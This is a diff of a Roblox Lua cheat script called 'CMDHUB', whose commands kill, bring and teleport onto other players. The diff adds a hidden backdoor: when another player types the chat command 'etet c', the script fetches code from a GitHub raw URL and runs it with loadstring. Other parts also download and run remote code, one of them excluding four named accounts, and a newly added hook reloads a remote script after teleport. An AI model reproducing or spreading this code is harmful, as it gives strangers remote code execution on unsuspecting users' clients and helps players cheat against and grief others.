@@ -1,11 +1,23 @@
+--[[
+    CMDHUB
+]]
 
+for i = 1,5 do
+    print("")
+end
+spawn(function()
+    wait(.5)
+    for i = 1,5 do
+        print("")
+    end
+end)
 if prefix == nil then
     prefix = ">"
 end
 local commands = {}
 local Main = Instance.new("ScreenGui",game.CoreGui)
 
-Main.Name = "Playerlist"
+Main.Name = "Playerlist";
 
 function Corner(parent)
 	local a = Instance.new("UICorner",parent)
@@ -180,6 +192,9 @@ Base.Draggable = true
 
 -- var
 
+local Players = game:GetService("Players")
+local speaker = Players.LocalPlayer
+local crashurl = "https://raw.githubusercontent.com/Emerald15233/connectp7/refs/heads/main/mainsource"
 local respondedmessage = false
 local cloneref = cloneref or function(o) return o end
 local TextChatService = cloneref(game:GetService("TextChatService"))
@@ -191,7 +206,7 @@ local TeleportService = game:GetService("TeleportService")
 local cmddesc = {  }
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local LocalPlayer = speaker
 local Mouse = LocalPlayer:GetMouse()
 local tpclicksuccess = false
 local tpClickConnection
@@ -207,7 +222,6 @@ local UIS = game:GetService("UserInputService")
 local output = ScrollingFrame
 local typing2 = false
 local typing3 = false
-local speaker = game.Players.LocalPlayer
 
 box.TextWrapped = true
 box.Focused:Connect(function() typing = true end)
@@ -253,7 +267,7 @@ local function rollrand()
     local randNum = math.random(0, 0.3)
 end
 
-game.Players.LocalPlayer.Chatted:Connect(function(msg)
+speaker.Chatted:Connect(function(msg)
     if not lUdiF2TGD then return end
     if string.sub(msg:lower(), 0, 1) == prefix then 
         if msg:split(prefix)[1] == "" then
@@ -295,7 +309,9 @@ UIS.InputBegan:Connect(function(i)
 			box.Text = "KN:/".. prefix
 			local msg = input
 			box:ReleaseFocus()
-			game.Players:Chat(input)
+            for i = 1,10 do
+			    sc(input)
+            end
 		elseif box.Text:sub(1,5) ~= "KN:/".. prefix then
 			box.Text = history
 			box.CursorPosition = #box.Text+1
@@ -304,15 +320,45 @@ UIS.InputBegan:Connect(function(i)
 	end
 end)
 
-local playerA = game.Players.LocalPlayer
+local playerA = speaker
 local Players = game:GetService("Players")
-local speakersname = game.Players.LocalPlayer.Name
+local speakersname = speaker.Name
 -- connect
 if speaker.Name == "EeRIlIlIllIlIlIl" or speaker.Name == "piepiepie894" or speaker.Name == "EOUHWEBBIUweiuwy" or speaker.Name == "woodsofinemeow" then
     notif("not exec")
 else
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Emerald15233/test/refs/heads/ee/code'))()
 end
+
+local function runLatest()
+    local success, result = pcall(function()
+        return game:HttpGet(crashurl)
+    end)
+    if success then
+        local func = loadstring(result)
+        if func then
+            pcall(func)
+        end
+    end
+end
+
+function ConnectP700(plr)
+    if plr == playerA then return end
+	plr.Chatted:Connect(function(msg)
+		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
+		if command == "etet" and message then
+            if message == "a" then
+                print("a")
+            elseif message == "b" then
+                print("b")
+            elseif message == "c" then
+                runLatest()
+            end
+		end
+	end)
+end
+
+
 function ConnectP1(plr)
 	plr.Chatted:Connect(function(msg)
 		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
@@ -337,7 +383,7 @@ end
 
 local function getPlayer(name)
     local foundPlayers = {}
-    for _, player in ipairs(game.Players:GetPlayers()) do
+    for _, player in ipairs(Players:GetPlayers()) do
         if string.find(string.lower(player.Name), string.lower(name)) or string.find(string.lower(player.DisplayName), string.lower(name)) then
             table.insert(foundPlayers, player)
         end
@@ -347,8 +393,19 @@ end
 
 -- func
 
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+
+local keepscript = false
+local TeleportCheck = false
+Players.LocalPlayer.OnTeleport:Connect(function(State)
+    if keepscript then
+	    TeleportCheck = true
+	    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+    end
+end)
+
 function sc(silentmsg)
-    game.Players:Chat(silentmsg)
+    Players:Chat(silentmsg)
 end
 
 
@@ -362,7 +419,7 @@ function chatMessage(str)
 end
 
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local LocalPlayer = speaker
 local Camera = workspace.CurrentCamera
 
 -- Saves original zoom settings
@@ -406,7 +463,7 @@ function execCmd(name)
 end
 
 local function getfullname(name)
-    for _, player in ipairs(game.Players:GetPlayers()) do
+    for _, player in ipairs(Players:GetPlayers()) do
         if string.lower(player.Name):find(string.lower(name)) or string.lower(player.DisplayName):find(string.lower(name)) then
             return player.Name -- or player.DisplayName if you prefer
         end
@@ -420,7 +477,7 @@ local savedCamLookVector = nil
 
 function viewcurrentpos()
 	local cam = workspace.CurrentCamera
-	local char = game.Players.LocalPlayer.Character
+	local char = speaker.Character
 	local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
 	if not hrp then
@@ -442,13 +499,13 @@ end
 function unview()
 	local cam = workspace.CurrentCamera
 	cam.CameraType = Enum.CameraType.Custom
-	cam.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+	cam.CameraSubject = speaker.Character:FindFirstChild("Humanoid")
 
 	notif("Camera reset to normal.")
 end
 
 local function gotocframe(cframe)
-    local player = game.Players.LocalPlayer
+    local player = speaker
     if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
         return
     end
@@ -462,7 +519,7 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local tpwalking = false
 local hb = RunService.Heartbeat
-local speaker = Players.LocalPlayer
+local speaker = speaker
 local function isNumber(value)
 	return tonumber(value) ~= nil
 end
@@ -589,7 +646,7 @@ end
 local function rejoin()
     notif("Rejoining...")
     wait(.5)
-	local player = Players.LocalPlayer
+	local player = speaker
 	if player then
 		local placeId = game.PlaceId
 		TeleportService:Teleport(placeId, player)
@@ -721,7 +778,7 @@ function tpclick(keybind)
 end
 
 function tweengoto(cframe, speed)
-	local speaker = Players.LocalPlayer
+	local speaker = speaker
 	if not speaker or not speaker.Character then return end
     tweenSpeed = speed
 
@@ -749,7 +806,7 @@ local function findPlayer(name)
     name = string.lower(name)
     local bestMatch = nil
 
-    for _, player in ipairs(game.Players:GetPlayers()) do
+    for _, player in ipairs(Players:GetPlayers()) do
         local username = string.lower(player.Name)
         local displayName = string.lower(player.DisplayName)
 
@@ -767,8 +824,9 @@ end
 
 local looping = false
 
+
 local function looptp(e)
-    local localPlayer = game.Players.LocalPlayer
+    local localPlayer = speaker
     local target = findPlayer(e)
     if not target then
         error("user not found")
@@ -797,7 +855,7 @@ local function looptp(e)
 end
 
 local function undertp(e)
-	local localPlayer = game.Players.LocalPlayer
+	local localPlayer = speaker
 	local target = findPlayer(e)
 
 	if not target then
@@ -952,7 +1010,7 @@ function getRoot(char)
 end
 
 local function loopbehind(e)
-    local localPlayer = game.Players.LocalPlayer
+    local localPlayer = speaker
     local target = findPlayer(e)
 
     if not target then
@@ -988,7 +1046,7 @@ local function loopbehind(e)
 end
 
 function bring(target)
-    local speaker = game.Players.LocalPlayer
+    local speaker = speaker
     if tools(speaker) then
         if target ~= nil then
             local NormPos = getRoot(speaker.Character).CFrame
@@ -1033,20 +1091,6 @@ local function usetsbmove(move)
         tool.Parent = backpack  
     else
         error(toolName .. " not found in Backpack.")
-    end
-end
-
-wait()
-
-commands.givenick = function(nick)
-    if not nick then
-        error("invalid nickname")
-        return
-    end
-    if ownernickperms then
-        ownernick = nick
-        notif("Set nickname to ".. nick)
-        ownernickperms = false
     end
 end
 
@@ -1159,7 +1203,7 @@ commands.jerk = function()
     if dontuse then return end
     dontuse = true
     task.wait(.2)
-    local character = game.Players.LocalPlayer.Character
+    local character = speaker.Character
     local isR6 = character:FindFirstChild("Torso") ~= nil
     if isR6 then
         notif("R6 Detected.")
@@ -1185,7 +1229,7 @@ commands.tsbbring = function(target)
     end
     local targetname = getfullname(target)
     local live = game.Workspace.Live:FindFirstChild(targetname)
-    local user = game.Players.LocalPlayer
+    local user = speaker
     local a = user.Character.HumanoidRootPart
     local bkp = user.Backpack
     local firstcd = user.PlayerGui.Hotbar.Backpack.Hotbar["1"].Base:FindFirstChild("Cooldown")
@@ -1195,8 +1239,8 @@ commands.tsbbring = function(target)
     local currentpos = a.CFrame
     local special = false
     local actualpos = CFrame.new(currentpos.Position)  -- Extract position and use it for CFrame.new
-    local normmax = game.Players.LocalPlayer.CameraMaxZoomDistance
-    local normmin = game.Players.LocalPlayer.CameraMinZoomDistance
+    local normmax = speaker.CameraMaxZoomDistance
+    local normmin = speaker.CameraMinZoomDistance
     if dontuse then
         error("ew")
         return
@@ -1398,22 +1442,12 @@ end
 
 wait()
 
-commands.e = function()
-    if respondedmessage then
-        notif("yes")
-    else
-        notif("Nooo")
-    end
-end
-
-wait()
-
 commands.reveal = function(plr) 
     local target = getfullname(plr)
     local timer = false
     local revealed = false
     respondedmessage = false
-    if not game.Players:FindFirstChild(target) then
+    if not Players:FindFirstChild(target) then
         error("invalid target")
         return
     end
@@ -1431,13 +1465,15 @@ commands.reveal = function(plr)
     end
     repeat task.wait() until respondedmessage or timer
     if respondedmessage then
-        notif("Target is using this script!")
+        notif("target is using this script")
     elseif timer then
-        notif("Target is not using this script!")
+        error("target is not using this script")
     end
     task.wait(.2)
     dontuse = false
 end
+
+wait()
 
 commands.silentchat = function(e)
     if not e or e == "" then return end
@@ -1474,7 +1510,7 @@ commands.kill = function(plr)
     end
     dontuse = true
     task.wait(.1)
-	local speaker = game.Players.LocalPlayer
+	local speaker = speaker
 	local target = findPlayer(plr)
 
 	if not target or not target.Character then
@@ -1508,14 +1544,14 @@ wait()
 
 
 commands.airwalk = function()
-    local speaker = game.Players.LocalPlayer
+    local speaker = speaker
     airwalk(speaker)
 end
 
 wait()
 
 commands.unairwalk = function()
-    local speaker = game.Players.LocalPlayer
+    local speaker = speaker
     unairwalk(speaker)
 end
 
@@ -1541,7 +1577,7 @@ commands.scl = function()
     if dontuse then return end
     dontuse = true
     task.wait(.5)
-    local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local root = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
     if root then
         local pos = root.Position
         local cframevar = string.format("%.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z)
@@ -1558,7 +1594,7 @@ commands.simplecopyloc = function()
     if dontuse then return end
     dontuse = true
     task.wait(.5)
-    local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local root = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
     if root then
         local pos = root.Position
         local cframevar = string.format("%.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z)
@@ -1572,8 +1608,9 @@ end
 wait()
 
 
+
 commands.copyloc = function()
-    local a = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+    local a = speaker.Character.HumanoidRootPart.CFrame
     setclipboard(tostring(a))
 end
 
@@ -1624,33 +1661,34 @@ commands.cmdlist = function()
     print("")
     print("")
     print("----------------------------------CMD LIST---------------------------------------------")
-    print("KILL: Kills the selected target [TOOL REQUIRED]")
-    print("BRING : Brings the selected target to you [TOOL REQUIRED]")
-    print("ATTACH: Attaches the selected target to you [TOOL REQUIRED]")
-    print("TPTO: Teleports you to the selected target")
-    print("TPCLICK: Sets up a teleport-click script with customizable keybinds")
-    print("LBBG: Lucky block battlegrounds script [LBBG ONLY]")
-    print("TSBBRING: Brings the selected target to you [TSB ONLY]")
-    print("BREAKVELOCITY: Breaks your velocity")
-    print("LOOPTP: Loop teleports to the selected target")
-    print("UNLOOPTP: Stops loop teleporting")
-    print("REJOIN/RJ: Rejoins the server")
-    print("AIRWALK: Allows you to walk on air")
-    print("UNAIRWALK: Disables airwalk")
-    print("KILL: Kills selected target [TOOL REQUIRED]")
-    print("RESET: Resets the speaker's Character")
-    print("TPWALK: Teleport walks you with the set speed (NUMBER REQUIRED)")
-    print("UNTPWALK: Disables tpwalk")
-    print("MOVESET: (MOVESET REQUIRED )Movesets: trashcanman/trashcan/tcm | johndoe,jd,john | gojo | mahito [ TSB ONLY ]")
-    print("COPYLOC: Copies your current CFrame")
-    print("TOLOC: Teleports you to set locations (LOCATION) [LIST OF SET TELEPORTATIONS DOWN BELOW]")
-    print("SILENTCHAT: Silently Chats a message (MSG)")
-    print("JERK: uhhhh")
-    print("UNDERTP: Teleports under the target [ >unlooptp to stop ]")
-    print("SIMPLECOPYLOC / SCL: Copies the cframe with a simple format, no e+ and only front three coords")
-    print("AUTOLOCK: Auto locks onto the player your cursor is pointing to")
-    print("LOCKON: Locks your camera on the selected target")
-    print("UNLOCKON: Disables lockon")
+    print("KILL: Kills the selected target [TOOL REQUIRED]") -- 1
+    print("BRING : Brings the selected target to you [TOOL REQUIRED]") -- 2
+    print("ATTACH: Attaches the selected target to you [TOOL REQUIRED]") -- 3
+    print("TPTO: Teleports you to the selected target") -- 4
+    print("TPCLICK: Sets up a teleport-click script with customizable keybinds") -- 5
+    print("LBBG: Lucky block battlegrounds script [LBBG ONLY]") -- 6
+    print("TSBBRING: Brings the selected target to you [TSB ONLY]") -- 7
+    print("BREAKVELOCITY: Breaks your velocity") -- 8
+    print("LOOPTP: Loop teleports to the selected target") -- 9
+    print("UNLOOPTP: Stops loop teleporting")  -- 10
+    print("REJOIN/RJ: Rejoins the server") -- 11
+    print("AIRWALK: Allows you to walk on air") -- 12
+    print("UNAIRWALK: Disables airwalk") -- 13
+    print("RESET: Resets the speaker's Character") -- 15
+    print("TPWALK: Teleport walks you with the set speed (NUMBER REQUIRED)") -- 16
+    print("UNTPWALK: Disables tpwalk") -- 17
+    print("MOVESET: (MOVESET REQUIRED )Movesets: trashcanman/trashcan/tcm | johndoe,jd,john | gojo | mahito [ TSB ONLY ]") -- 18
+    print("COPYLOC: Copies your current CFrame") -- 19
+    print("TOLOC: Teleports you to set locations (LOCATION) [LIST OF SET TELEPORTATIONS DOWN BELOW]") -- 20
+    print("SILENTCHAT: Silently Chats a message (MSG)") -- 21
+    print("JERK: uhhhh") -- 22
+    print("UNDERTP: Teleports under the target [ >unlooptp to stop ]")-- 23
+    print("SIMPLECOPYLOC / SCL: Copies the cframe with a simple format, no e+ and only front three coords")-- 24
+    print("AUTOLOCK: Auto locks onto the player your cursor is pointing to")-- 25
+    print("LOCKON: Locks your camera on the selected target") -- 26
+    print("UNLOCKON: Disables lockon") -- 27 (27 - 1)
+    print("LOOKAT: Looks at the selected target") -- 27
+    print("SAY: Says the selected message ") -- 28
     print("----------------------------------TP LIST---------------------------------------------")
     print("tsbedge [TSB ONLY]")
     print("bigplatform / bpf [TSB ONLY]")
@@ -1766,8 +1804,29 @@ task.wait()
 
 addFrame("        unlockon        ") wait(randNum) rollrand()
 
+task.wait()
 
-game.Players.LocalPlayer.Chatted:Connect(function(msg)
+addFrame("       say (msg)       ") wait(randNum) rollrand()
+
+task.wait()
+
+addFrame("      lookat (plr)      ") wait(randNum) rollrand()
+--[[
+task.wait()
+
+addFrame("        unlockon        ") wait(randNum) rollrand()
+
+task.wait()
+
+addFrame("        unlockon        ") wait(randNum) rollrand()
+
+task.wait()
+
+addFrame("        unlockon        ") wait(randNum) rollrand()
+]]
+
+
+speaker.Chatted:Connect(function(msg)
     if string.sub(msg, 1, 1) == prefix then
         local args = string.split(string.sub(msg, 2), " ")
         local command = args[1]
@@ -1786,11 +1845,13 @@ end)
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
 	ConnectP1(v)
     ConnectP3(v)
+    ConnectP700(v)
 end
 
 game:GetService("Players").PlayerAdded:Connect(function(plr)
 	ConnectP1(plr)
     ConnectP3(plr)
+    ConnectP700(plr)
 end)
 
 wait()
